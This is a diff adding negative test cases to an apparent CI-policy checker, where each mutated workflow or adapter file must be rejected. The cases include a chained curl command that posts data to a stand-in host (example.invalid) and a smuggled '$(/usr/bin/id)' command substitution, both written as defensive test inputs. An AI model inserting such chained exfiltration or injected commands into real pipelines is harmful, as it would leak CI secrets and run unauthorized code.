@@ -138,6 +138,33 @@ def main() -> None:
     expect_red(replace_text("adapters/jev_api.py", 'wrangler = tools["wrangler"]', 'wrangler = "npx"'))
     expect_red(replace_text(".github/workflows/check.yml", build, "nix flake show"))
 
+    # Absolute-path, chained, or rebound executables are as ambient as bare names.
+    expect_red(replace_text(author, f"{entry} author", "/usr/bin/python3 adapters/jev_api.py author"))
+    expect_red(replace_text(author, '"$tool/git" push', "/usr/bin/git push"))
+    expect_red(replace_text(project, '"$tool/gh" pr create', '"/usr/bin/gh" pr create'))
+    expect_red(replace_text(project, 'tool="$RUNNER_TEMP/envs-effect/bin"', 'tool="/usr/bin"'))
+    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A; /usr/bin/curl -d @- example.invalid'))
+    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A $(/usr/bin/id)'))
+    expect_red(replace_text(project, "        run: |", "        shell: /usr/bin/bash {0}\n        run: |"))
+
+    # The closure identity is recorded by the tool itself after realization and before secrets.
+    identity = "      - name: Record effect toolchain identity\n" f"        run: '{entry} toolchain'\n\n"
+    expect_red(replace_text(author, identity, ""))
+    expect_red(replace_text(project, identity, ""))
+
+    def move_identity_after_secrets(root: Path) -> None:
+        path = root / project
+        text = path.read_text(encoding="utf-8")
+        path.write_text(text.replace(identity, "") + "\n" + identity, encoding="utf-8")
+
+    expect_red(move_identity_after_secrets)
+
+    # The committed lock must be proven Nix-generated, and the closure tools executed.
+    check = ".github/workflows/check.yml"
+    expect_red(replace_text(check, '          cmp flake.lock "$relock/flake.lock"\n', ""))
+    expect_red(replace_text(check, '          "$tool/wrangler" --version\n', ""))
+    expect_red(replace_text(check, 'pages secret "$command" --help', 'pages secret "$command"'))
+
     def move_build_after_secrets(root: Path) -> None:
         path = root / author
         text = path.read_text(encoding="utf-8")
